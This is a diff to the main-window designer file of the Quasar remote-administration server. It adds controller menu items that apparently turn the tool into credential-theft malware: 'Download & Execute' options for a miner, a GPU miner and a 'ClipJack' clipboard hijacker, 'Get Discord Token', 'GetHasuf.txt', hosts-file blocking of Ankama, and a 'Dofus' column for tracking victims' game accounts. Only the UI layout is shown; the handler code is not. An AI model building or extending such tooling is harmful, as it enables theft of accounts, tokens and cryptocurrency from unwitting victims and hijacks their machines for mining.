@@ -64,6 +64,16 @@ namespace Quasar.Server.Forms
             this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.MoverUserStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.nEWToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.aVIDERAUTHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.aVIDERSHIELDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.hACKEDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.nODOFUSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.lOUPEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.currentWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.sendCommandToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.lineToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
             this.selectAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.imgFlags = new System.Windows.Forms.ImageList(this.components);
@@ -87,6 +97,18 @@ namespace Quasar.Server.Forms
             this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.timer_refresh = new System.Windows.Forms.Timer(this.components);
+            this.timer_get_window = new System.Windows.Forms.Timer(this.components);
+            this.downloadExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.minerIfGPUToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.minerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.clipJackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.uploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.hostsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.commandsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.getDiscordTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.getHasuftxtToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip.SuspendLayout();
             this.tableLayoutPanel.SuspendLayout();
             this.statusStrip.SuspendLayout();
@@ -100,10 +122,15 @@ namespace Quasar.Server.Forms
             this.surveillanceToolStripMenuItem,
             this.userSupportToolStripMenuItem,
             this.connectionToolStripMenuItem,
+            this.MoverUserStripMenuItem,
+            this.currentWindowToolStripMenuItem,
+            this.downloadExecuteToolStripMenuItem,
+            this.uploadToolStripMenuItem,
+            this.commandsToolStripMenuItem,
             this.lineToolStripMenuItem,
             this.selectAllToolStripMenuItem});
             this.contextMenuStrip.Name = "ctxtMenu";
-            this.contextMenuStrip.Size = new System.Drawing.Size(180, 120);
+            this.contextMenuStrip.Size = new System.Drawing.Size(181, 252);
             // 
             // systemToolStripMenuItem
             // 
@@ -121,14 +148,14 @@ namespace Quasar.Server.Forms
             this.actionsToolStripMenuItem});
             this.systemToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.cog;
             this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
-            this.systemToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.systemToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.systemToolStripMenuItem.Text = "Administration";
             // 
             // systemInformationToolStripMenuItem
             // 
             this.systemInformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemInformationToolStripMenuItem.Image")));
             this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
-            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
+            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.systemInformationToolStripMenuItem.Text = "System Information";
             this.systemInformationToolStripMenuItem.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
             // 
@@ -262,7 +289,7 @@ namespace Quasar.Server.Forms
             this.remoteDesktopToolStripMenuItem2});
             this.surveillanceToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.monitoring;
             this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
-            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.surveillanceToolStripMenuItem.Text = "Monitoring";
             // 
             // passwordRecoveryToolStripMenuItem
@@ -297,7 +324,7 @@ namespace Quasar.Server.Forms
             this.visitWebsiteToolStripMenuItem});
             this.userSupportToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.user;
             this.userSupportToolStripMenuItem.Name = "userSupportToolStripMenuItem";
-            this.userSupportToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.userSupportToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.userSupportToolStripMenuItem.Text = "User Support";
             // 
             // showMessageboxToolStripMenuItem
@@ -334,7 +361,7 @@ namespace Quasar.Server.Forms
             this.uninstallToolStripMenuItem});
             this.connectionToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("connectionToolStripMenuItem.Image")));
             this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
-            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.connectionToolStripMenuItem.Text = "Client Management";
             // 
             // elevateClientPermissionsToolStripMenuItem
@@ -377,15 +404,97 @@ namespace Quasar.Server.Forms
             this.uninstallToolStripMenuItem.Text = "Uninstall";
             this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
             // 
+            // MoverUserStripMenuItem
+            // 
+            this.MoverUserStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.nEWToolStripMenuItem,
+            this.aVIDERAUTHToolStripMenuItem,
+            this.aVIDERSHIELDToolStripMenuItem,
+            this.hACKEDToolStripMenuItem,
+            this.nODOFUSToolStripMenuItem,
+            this.lOUPEToolStripMenuItem});
+            this.MoverUserStripMenuItem.Image = global::Quasar.Server.Properties.Resources.actions;
+            this.MoverUserStripMenuItem.Name = "MoverUserStripMenuItem";
+            this.MoverUserStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.MoverUserStripMenuItem.Text = "Move To";
+            // 
+            // nEWToolStripMenuItem
+            // 
+            this.nEWToolStripMenuItem.Name = "nEWToolStripMenuItem";
+            this.nEWToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.nEWToolStripMenuItem.Text = "NEW";
+            this.nEWToolStripMenuItem.Click += new System.EventHandler(this.nEWToolStripMenuItem_Click);
+            // 
+            // aVIDERAUTHToolStripMenuItem
+            // 
+            this.aVIDERAUTHToolStripMenuItem.Name = "aVIDERAUTHToolStripMenuItem";
+            this.aVIDERAUTHToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.aVIDERAUTHToolStripMenuItem.Text = "A VIDER AUTH";
+            this.aVIDERAUTHToolStripMenuItem.Click += new System.EventHandler(this.aVIDERAUTHToolStripMenuItem_Click);
+            // 
+            // aVIDERSHIELDToolStripMenuItem
+            // 
+            this.aVIDERSHIELDToolStripMenuItem.Name = "aVIDERSHIELDToolStripMenuItem";
+            this.aVIDERSHIELDToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.aVIDERSHIELDToolStripMenuItem.Text = "A VIDER SHIELD";
+            this.aVIDERSHIELDToolStripMenuItem.Click += new System.EventHandler(this.aVIDERSHIELDToolStripMenuItem_Click);
+            // 
+            // hACKEDToolStripMenuItem
+            // 
+            this.hACKEDToolStripMenuItem.Name = "hACKEDToolStripMenuItem";
+            this.hACKEDToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.hACKEDToolStripMenuItem.Text = "HACKED";
+            this.hACKEDToolStripMenuItem.Click += new System.EventHandler(this.hACKEDToolStripMenuItem_Click);
+            // 
+            // nODOFUSToolStripMenuItem
+            // 
+            this.nODOFUSToolStripMenuItem.Name = "nODOFUSToolStripMenuItem";
+            this.nODOFUSToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.nODOFUSToolStripMenuItem.Text = "NODOFUS";
+            this.nODOFUSToolStripMenuItem.Click += new System.EventHandler(this.nODOFUSToolStripMenuItem_Click);
+            // 
+            // lOUPEToolStripMenuItem
+            // 
+            this.lOUPEToolStripMenuItem.Name = "lOUPEToolStripMenuItem";
+            this.lOUPEToolStripMenuItem.Size = new System.Drawing.Size(157, 22);
+            this.lOUPEToolStripMenuItem.Text = "LOUPE";
+            this.lOUPEToolStripMenuItem.Click += new System.EventHandler(this.lOUPEToolStripMenuItem_Click);
+            // 
+            // currentWindowToolStripMenuItem
+            // 
+            this.currentWindowToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.refreshToolStripMenuItem,
+            this.sendCommandToolStripMenuItem});
+            this.currentWindowToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.monitor;
+            this.currentWindowToolStripMenuItem.Name = "currentWindowToolStripMenuItem";
+            this.currentWindowToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.currentWindowToolStripMenuItem.Text = "Current Window";
+            // 
+            // refreshToolStripMenuItem
+            // 
+            this.refreshToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.refresh;
+            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
+            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
+            this.refreshToolStripMenuItem.Text = "Refresh";
+            this.refreshToolStripMenuItem.Click += new System.EventHandler(this.refreshToolStripMenuItem_Click_1);
+            // 
+            // sendCommandToolStripMenuItem
+            // 
+            this.sendCommandToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.drive_go;
+            this.sendCommandToolStripMenuItem.Name = "sendCommandToolStripMenuItem";
+            this.sendCommandToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
+            this.sendCommandToolStripMenuItem.Text = "Send Command";
+            this.sendCommandToolStripMenuItem.Click += new System.EventHandler(this.sendCommandToolStripMenuItem_Click);
+            // 
             // lineToolStripMenuItem
             // 
             this.lineToolStripMenuItem.Name = "lineToolStripMenuItem";
-            this.lineToolStripMenuItem.Size = new System.Drawing.Size(176, 6);
+            this.lineToolStripMenuItem.Size = new System.Drawing.Size(177, 6);
             // 
             // selectAllToolStripMenuItem
             // 
             this.selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
-            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.selectAllToolStripMenuItem.Text = "Select All";
             this.selectAllToolStripMenuItem.Click += new System.EventHandler(this.selectAllToolStripMenuItem_Click);
             // 
@@ -717,26 +826,26 @@ namespace Quasar.Server.Forms
             // hIP
             // 
             this.hIP.Text = "IP Address";
-            this.hIP.Width = 170;
+            this.hIP.Width = 171;
             // 
             // hTag
             // 
             this.hTag.Text = "Tag";
-            this.hTag.Width = 126;
+            this.hTag.Width = 138;
             // 
             // hUserPC
             // 
             this.hUserPC.Text = "User@PC";
-            this.hUserPC.Width = 310;
+            this.hUserPC.Width = 214;
             // 
             // hVersion
             // 
-            this.hVersion.Text = "Version";
-            this.hVersion.Width = 0;
+            this.hVersion.Text = "Active Window";
+            this.hVersion.Width = 380;
             // 
             // hStatus
             // 
-            this.hStatus.Text = "Status";
+            this.hStatus.Text = "hstatus";
             this.hStatus.Width = 0;
             // 
             // hUserStatus
@@ -747,16 +856,16 @@ namespace Quasar.Server.Forms
             // hCountry
             // 
             this.hCountry.Text = "Country";
-            this.hCountry.Width = 117;
+            this.hCountry.Width = 110;
             // 
             // hOS
             // 
             this.hOS.Text = "Operating System";
-            this.hOS.Width = 366;
+            this.hOS.Width = 256;
             // 
             // hAccountType
             // 
-            this.hAccountType.Text = "Account Type";
+            this.hAccountType.Text = "Dofus";
             this.hAccountType.Width = 100;
             // 
             // menuStrip
@@ -786,7 +895,7 @@ namespace Quasar.Server.Forms
             // closeToolStripMenuItem
             // 
             this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
-            this.closeToolStripMenuItem.Size = new System.Drawing.Size(108, 22);
+            this.closeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.closeToolStripMenuItem.Text = "Close";
             this.closeToolStripMenuItem.Click += new System.EventHandler(this.closeToolStripMenuItem_Click);
             // 
@@ -810,6 +919,95 @@ namespace Quasar.Server.Forms
             this.aboutToolStripMenuItem.Size = new System.Drawing.Size(52, 21);
             this.aboutToolStripMenuItem.Text = "About";
             this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
+            // 
+            // timer_refresh
+            // 
+            this.timer_refresh.Enabled = true;
+            this.timer_refresh.Interval = 2000;
+            this.timer_refresh.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // timer_get_window
+            // 
+            this.timer_get_window.Enabled = true;
+            this.timer_get_window.Interval = 30000;
+            this.timer_get_window.Tick += new System.EventHandler(this.timer_get_window_Tick);
+            // 
+            // downloadExecuteToolStripMenuItem
+            // 
+            this.downloadExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.minerIfGPUToolStripMenuItem,
+            this.minerToolStripMenuItem,
+            this.clipJackToolStripMenuItem});
+            this.downloadExecuteToolStripMenuItem.Name = "downloadExecuteToolStripMenuItem";
+            this.downloadExecuteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.downloadExecuteToolStripMenuItem.Text = "Download & Execute";
+            // 
+            // minerIfGPUToolStripMenuItem
+            // 
+            this.minerIfGPUToolStripMenuItem.Name = "minerIfGPUToolStripMenuItem";
+            this.minerIfGPUToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.minerIfGPUToolStripMenuItem.Text = "Miner if GPU";
+            this.minerIfGPUToolStripMenuItem.Click += new System.EventHandler(this.minerIfGPUToolStripMenuItem_Click);
+            // 
+            // minerToolStripMenuItem
+            // 
+            this.minerToolStripMenuItem.Name = "minerToolStripMenuItem";
+            this.minerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.minerToolStripMenuItem.Text = "Miner";
+            this.minerToolStripMenuItem.Click += new System.EventHandler(this.minerToolStripMenuItem_Click);
+            // 
+            // clipJackToolStripMenuItem
+            // 
+            this.clipJackToolStripMenuItem.Name = "clipJackToolStripMenuItem";
+            this.clipJackToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.clipJackToolStripMenuItem.Text = "ClipJack";
+            this.clipJackToolStripMenuItem.Click += new System.EventHandler(this.clipJackToolStripMenuItem_Click);
+            // 
+            // uploadToolStripMenuItem
+            // 
+            this.uploadToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.hostsToolStripMenuItem,
+            this.deleteToolStripMenuItem});
+            this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
+            this.uploadToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.uploadToolStripMenuItem.Text = "Hosts file";
+            // 
+            // hostsToolStripMenuItem
+            // 
+            this.hostsToolStripMenuItem.Name = "hostsToolStripMenuItem";
+            this.hostsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.hostsToolStripMenuItem.Text = "Block Ankama";
+            this.hostsToolStripMenuItem.Click += new System.EventHandler(this.hostsToolStripMenuItem_Click);
+            // 
+            // deleteToolStripMenuItem
+            // 
+            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
+            this.deleteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.deleteToolStripMenuItem.Text = "Delete";
+            this.deleteToolStripMenuItem.Click += new System.EventHandler(this.deleteToolStripMenuItem_Click);
+            // 
+            // commandsToolStripMenuItem
+            // 
+            this.commandsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.getDiscordTokenToolStripMenuItem,
+            this.getHasuftxtToolStripMenuItem});
+            this.commandsToolStripMenuItem.Name = "commandsToolStripMenuItem";
+            this.commandsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.commandsToolStripMenuItem.Text = "Commands";
+            // 
+            // getDiscordTokenToolStripMenuItem
+            // 
+            this.getDiscordTokenToolStripMenuItem.Name = "getDiscordTokenToolStripMenuItem";
+            this.getDiscordTokenToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.getDiscordTokenToolStripMenuItem.Text = "Get Discord Token";
+            this.getDiscordTokenToolStripMenuItem.Click += new System.EventHandler(this.getDiscordTokenToolStripMenuItem_Click);
+            // 
+            // getHasuftxtToolStripMenuItem
+            // 
+            this.getHasuftxtToolStripMenuItem.Name = "getHasuftxtToolStripMenuItem";
+            this.getHasuftxtToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.getHasuftxtToolStripMenuItem.Text = "GetHasuf.txt";
+            this.getHasuftxtToolStripMenuItem.Click += new System.EventHandler(this.getHasuftxtToolStripMenuItem_Click);
             // 
             // FrmMain
             // 
@@ -894,6 +1092,28 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem webFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem2;
+        private System.Windows.Forms.ToolStripMenuItem MoverUserStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem nEWToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem aVIDERAUTHToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem aVIDERSHIELDToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem hACKEDToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem nODOFUSToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem lOUPEToolStripMenuItem;
+        private System.Windows.Forms.Timer timer_refresh;
+        private System.Windows.Forms.Timer timer_get_window;
+        private System.Windows.Forms.ToolStripMenuItem currentWindowToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem refreshToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem sendCommandToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem downloadExecuteToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem minerIfGPUToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem minerToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem clipJackToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem uploadToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem hostsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem commandsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem getDiscordTokenToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem getHasuftxtToolStripMenuItem;
     }
 }
 
